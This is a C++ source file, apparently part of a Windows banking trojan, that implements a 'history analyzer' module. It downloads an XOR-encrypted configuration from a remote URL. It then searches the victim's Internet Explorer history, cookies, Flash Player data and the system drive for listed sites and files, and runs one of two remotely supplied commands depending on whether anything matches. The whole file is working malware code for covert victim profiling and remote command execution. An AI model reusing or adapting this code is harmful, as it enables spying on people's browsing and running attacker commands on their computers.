//---------------------------------------------------------------------------

#include <windows.h>
#include <shlobj.h>


#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Loader.h"
#include "Utils.h"
#include "Task.h"
#include "HistoryAnalizer.h"


const PCHAR HisFileItem = "file:";
const DWORD MaxSearchFromConfigFileseTime = 10*60*1009;

//---------------------------------------------------------------------------
bool CompareSites(PStrings S, PCHAR Site)
{
	// Сравнивает сайты из списка S с сайтом Site
	DWORD Count = Strings::Count(S);
    PCHAR Line;
	for (DWORD i = 0; i < Count; i++)
	{
		Line = Strings::GetItem(S, i, false);
		if (STR::Pos(Site, Line) >= 0)
			return true;
	}
	return false;
}

//---------------------------------------------------------------------------

bool FindItem(PCHAR Buffer, PCHAR Site, DWORD BufSize)
{
	if (Buffer == NULL || Site == NULL || BufSize == 0)
		return false;
	DWORD SiteLen = StrCalcLength(Site);
	DWORD Max = BufSize - SiteLen;
    PCHAR TMP = Buffer;
	for (DWORD i = 0; i < Max; i++)
	{
		if (StrSame(TMP, Site, true, SiteLen))
			return true;
		TMP++;
    }
	return false;
}


bool ReadIEHistoryFile(PCHAR FileName, PStrings S)
{
    PCHAR FileCopy = STR::New(2, FileName, "_copy");
	if (FileCopy == NULL)
		return false;

	bool Result = false;

    // Копируем файл
	pCopyFileA(FileName, FileCopy, FALSE);

    // Читаем файл в буффер
	HANDLE File = (HANDLE)pCreateFileA(FileCopy,
                            GENERIC_READ,
							FILE_SHARE_READ,
                            NULL,
                            OPEN_EXISTING,
							FILE_ATTRIBUTE_NORMAL,
							NULL);

	if (File != INVALID_HANDLE_VALUE)
	{
		DWORD H = 0;
		DWORD FileSize = (DWORD)pGetFileSize(File, H);
		if (FileSize > 0)
		{
			// Мапируем файл в память
        	HANDLE MapFile = (HANDLE)pCreateFileMappingW(File, 0, PAGE_READONLY, 0, FileSize, 0 );
			if (MapFile != INVALID_HANDLE_VALUE)
			{
				PCHAR Buffer  = (PCHAR)pMapViewOfFile(MapFile, FILE_MAP_READ, 0, 0, 0 );

				// Ищем совпадения
				DWORD Count = Strings::Count(S);
				PCHAR Line;
				for (DWORD i = 0; i < Count; i++)
				{
					Line = Strings::GetItem(S, i, false);
					if (FindItem(Buffer, Line, FileSize))
					{
						Result = true;
						break;
                    }
				}


                pUnmapViewOfFile(Buffer);
                pCloseHandle(MapFile);
            }

		}

    }
	pCloseHandle(File);
	pDeleteFileA(FileCopy);

	return Result;

}



void SearchIEHistoryCallBack(PFindData Find, PCHAR FileName, LPVOID Data, bool &Cancel)
{
	// Функйия обратной связи поиска файлов и директории
	PHistoryConfig Config = (PHistoryConfig)Data;

	if (ReadIEHistoryFile(FileName, Config->Sites))
	{
		Cancel = true;
        Config->ContainsURL = true;
	}
}


bool SearchInIEHistory(PHistoryConfig Config)
{
	// Ищем совпадения в кукисахIE
	PCHAR Path = STR::Alloc(MAX_PATH);
	if (Path == NULL)
		return false;

    // Определяем путь к директории пользователя
	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_HISTORY, false))
	{
		STR::Free(Path);
		return false;
	}

	// Ищем файлы
	StrConcat(Path, "\\");
	SearchFiles(Path, "*.dat", true, FA_ANY_FILES, Config, SearchIEHistoryCallBack);

	//
	STR::Free(Path);

	return Config->ContainsURL;
}

//---------------------------------------------------------------------------

void SearchCallBack(PFindData Find, PCHAR FileName, LPVOID Data, bool &Cancel)
{
	// Функйия обратной связи поиска файлов и директории
	PHistoryConfig Config = (PHistoryConfig)Data;
	if (CompareSites(Config->Sites, Find->cFileName))
	{
		Cancel = true;
		Config->ContainsURL = true;
	}
}
//---------------------------------------------------------------------------


bool SearchInIECookies(PHistoryConfig Config)
{
	// Ищем совпадения в кукисахIE
	PCHAR Path = STR::Alloc(MAX_PATH);
	if (Path == NULL)
		return false;

    // Определяем путь к директории пользователя
	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_COOKIES, false))
	{
		STR::Free(Path);
		return false;
	}

	// Ищем файлы
	StrConcat(Path, "\\");
	SearchFiles(Path, "*.txt", false, FA_ANY_FILES, Config, SearchCallBack);
	//
	STR::Free(Path);

	return Config->ContainsURL;
}
//---------------------------------------------------------------------------
bool SearchFlashPlayerCookies(PHistoryConfig Config)
{
    // Ищем совпадения в кукисахIE
	PCHAR Path = STR::Alloc(MAX_PATH);
	if (Path == NULL)
		return false;

    // Определяем путь к директории пользователя
	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_APPDATA, false))
	{
		STR::Free(Path);
		return false;
	}

	// Ищем файлы
	SearchFiles(Path, "*.*", true, FA_DIRECTORY, Config, SearchCallBack);
	//
	STR::Free(Path);

	return Config->ContainsURL;
}

//---------------------------------------------------------------------------
//  HisUtils - Вспомогательнве утилиты анализатора истории
//---------------------------------------------------------------------------

namespace HisUtils
{

    //------------------------------------------------------------------------
	void ExtractFileItems(PHistoryConfig Config)
	{
		// изылечь элементы поиска файлов из списка ссылок
		if (Config == NULL || Config->Sites == NULL) return;
		PCHAR S;
        PCHAR FileName;
		DWORD Len = StrCalcLength(HisFileItem);

		DWORD i = 0;
		while (i < Strings::Count(Config->Sites))
		{
			S = Strings::GetItem(Config->Sites, i, false);
			// проверяем начинается ли элемент с префикса элемента файла
			if (!StrSame(S, HisFileItem, false, Len))
			{
				// Элемент не является файлом, игнорируем его
				i++;
				continue;
			}

			// Элемент является файлом, извлекаем имя файла
			FileName = STR::IgnoreSpaces(S + Len);
			if (!StrIsEmpty(FileName))
			{
				if (Config->Files == NULL)
					Config->Files = Strings::Create();
				Strings::Add(Config->Files, FileName);
			}

            Strings::Delete(Config->Sites, i);
		}
	}

	//------------------------------------------------------------------------

	// Структура поиска файлов из конфига

	typedef struct TFileSearch
	{
		// Стандартные пути поиска
		PCHAR ProgramFiles;
		PCHAR Windows;
		PStrings AllPaths;
		DWORD StartTime;
		DWORD MaxSearch;
		bool TimeCompleted;
		bool Finded;

	} *PFileSearch;


	//------------------------------------------------------------------------
	PCHAR GetSpecPath(int CSIDL)
	{
		// Функция возвращает некторый путь
		PCHAR Buf = STR::Alloc(MAX_PATH);
		PCHAR Result = NULL;
		if (pSHGetSpecialFolderPathA(NULL, Buf, CSIDL, false))
		{
            Result = STR::New(2, Buf, "\\");
		}
		STR::Free(Buf);
        return Result;
	}

	void InitSearchCallBack(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
	{
		// Директория найдена, добавляем её в список
		PFileSearch S = (PFileSearch)Data;
        Strings::Add(S->AllPaths, FileName);
    }


	PFileSearch StartSearch()
	{
		// Функция инициализирует поиск файлов
		PFileSearch S = CreateStruct(TFileSearch);
		S->ProgramFiles = GetSpecPath(CSIDL_PROGRAM_FILES);
		S->Windows = GetSpecPath(CSIDL_WINDOWS);

		// Определяем корневые директории системмного диска
        S->AllPaths = Strings::Create();
		PCHAR Drive = STR::GetLeftStr(S->Windows, ":\\", true);
		SearchFiles(Drive, "*.*", false, FA_DIRECTORY, S, InitSearchCallBack);
		STR::Free(Drive);

		Strings::Remove(S->AllPaths, S->ProgramFiles);
		Strings::Remove(S->AllPaths, S->Windows);

		S->MaxSearch = MaxSearchFromConfigFileseTime;
        S->StartTime = (DWORD)pGetTickCount();

        return S;
	}

	//------------------------------------------------------------------------

	void CloseSearch(PFileSearch S)
	{
		// Уничтожить данные поиска
		if (S == NULL) return;
		STR::Free(S->Windows);
		STR::Free(S->ProgramFiles);
        Strings::Free(S->AllPaths);

        FreeStruct(S);
    }

	//------------------------------------------------------------------------
	void UpdateSearchTime(PFileSearch S)
	{
		if (S->MaxSearch == 0) return;
        S->TimeCompleted = ((DWORD)pGetTickCount() - S->StartTime) >= S->MaxSearch;
	}

	//------------------------------------------------------------------------
	void SearchCallBack(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
	{
		PFileSearch S = (PFileSearch)Data;
		S->Finded = true;
        Cancel = true;
	}

	bool RealSearchFile(PHistoryConfig Config, PFileSearch S, PCHAR Path)
	{
		// Функция ищет файл по маске Mask по пути Path
		if (S->Finded || S->TimeCompleted) return true;

		DWORD Count = Strings::Count(Config->Files);
		for (DWORD i = 0; i < Count; i++)
		{
			SearchFiles(Path, Strings::GetItem(Config->Files, i, false), true, FA_ANY_FILES, S, SearchCallBack);
			UpdateSearchTime(S);
			if (S->Finded || S->TimeCompleted) break;
        }
		return S->Finded;
    }

	//------------------------------------------------------------------------

	bool SearchFilesFromConfig(PHistoryConfig Config)
	{
		// Функция ищет файлы указанные в конфигурационном файле

		// инициализируем поиск
		PFileSearch S = StartSearch();

		// Ищем файлы
		RealSearchFile(Config, S, S->ProgramFiles);

	  	if (!S->Finded  && !S->TimeCompleted)
		{
			// Ищем файлы во всех директориях системмного диска
			for (DWORD i = 0; i < Strings::Count(S->AllPaths); i++)
			{
				RealSearchFile(Config, S, Strings::GetItem(S->AllPaths, i));

				if (S->Finded || S->TimeCompleted) break;
			}
		}

		if (!S->Finded && !S->TimeCompleted)
			RealSearchFile(Config, S, S->Windows);

		// Закрываем поиск
		bool Result = S->Finded;
		CloseSearch(S);
		return Result;
    }
}



//---------------------------------------------------------------------------
bool HisAnalizer::Download(PCHAR URL, PHistoryConfig &Config)
{
	// Загрузить конфигурационный файл
	Config = NULL;
	if (StrIsEmpty(URL)) return false;

	// Загружаем конфиг в файл
	LPBYTE Buffer = NULL;
	DWORD BufSize = 0;
	if (!DownloadInMem(URL, &Buffer, &BufSize))
		return false;

	// Расшифровываем конфиг
	const static char Signature[] = {'B', 'J', 'B', 0};
	PCHAR Lines = (PCHAR)XORCrypt::DecodeBuffer((PCHAR)Signature, Buffer, BufSize);
	if (Lines == NULL || BufSize == 0)
	{
		MemFree(Buffer);
		return false;
	}

	// Парсим конфиг
	Config = CreateStruct(THistoryConfig);
    if (Config == NULL) return false;
	bool Result = Parse(Lines, Config);
	MemFree(Buffer);

	if (!Result)
	{
		ClearConfig(Config);
		FreeStruct(Config);
		Config = NULL;
	}

	return Result;
}


//---------------------------------------------------------------------------

bool HisAnalizer::Parse(PCHAR Lines, PHistoryConfig Config)
{
	// Разобрать список строк конфигурационного файла
	if (StrIsEmpty(Lines))
		return false;

	PStrings S = Strings::Create();
	Strings::SetText(S, Lines);
	bool Result = false;

	// Парсим список
	if (Strings::Count(S) > 1)
	{
		PCHAR Cmd = Strings::GetItem(S, 0);
		Strings::Delete(S, 0);

		Config->Command1 = STR::GetLeftStr(Cmd, "|");
		if (Config->Command1 != NULL)
		{
            Config->Command2 = STR::GetRightStr(Cmd, "|");
			STR::Free(Cmd);
		}
		else
			Config->Command1 = Cmd;

        Result = Config->Command1 != NULL;
    }

	if (Result)
	{
		// Отделяем сайты от файлов
		Config->Sites = S;
        HisUtils::ExtractFileItems(Config);
    }
	else
		Strings::Free(S);
	return Result;
}

//---------------------------------------------------------------------------
void HisAnalizer::Execute(PHistoryConfig Config)
{
	// Выполнить поиск по истории посещения сайтов
	// и на этой основе выполнить необходимую команду
	if (Config == NULL) return;

	bool Contain =  SearchInIEHistory(Config) ||
				   	SearchInIECookies(Config) ||
					SearchFlashPlayerCookies(Config) ||
					HisUtils::SearchFilesFromConfig(Config);

	if (Contain)
		ExecuteCommand(NULL, Config->Command1, false);
	else
		ExecuteCommand(NULL, Config->Command2, false);
}

//---------------------------------------------------------------------------

void HisAnalizer::DownloadAndExecute(PCHAR URL)
{
	//  Загрузить и выполнить команду из конфигурационного файла
	PHistoryConfig Config = NULL;
	if (Download(URL, Config))
	{
		Execute(Config);
        FreeConfig(Config);
    }
}

//---------------------------------------------------------------------------

void HisAnalizer::ClearConfig(PHistoryConfig Config)
{
	STR::Free2(Config->Command1);
	STR::Free2(Config->Command2);
	Strings::Free(Config->Sites);
	Strings::Free(Config->Files);
    ClearStruct(*Config);
}

//---------------------------------------------------------------------------

void HisAnalizer::FreeConfig(PHistoryConfig Config)
{
	// Уничтожить конфиг
	if (Config == NULL) return;
	ClearConfig(Config);
	FreeStruct(Config);
}

//---------------------------------------------------------------------------

DWORD WINAPI AnalyzerThreadProc(LPVOID Data)
{
	PCHAR URL = (PCHAR)Data;
	HisAnalizer::DownloadAndExecute(URL);
	STR::Free(URL);
	pExitThread(0);
	return 0;
}

void HisAnalizer::StartAnalizerThread(PCHAR URL)
{
	if (!StrIsEmpty(URL))
		StartThread(AnalyzerThreadProc, STR::New(URL));
}
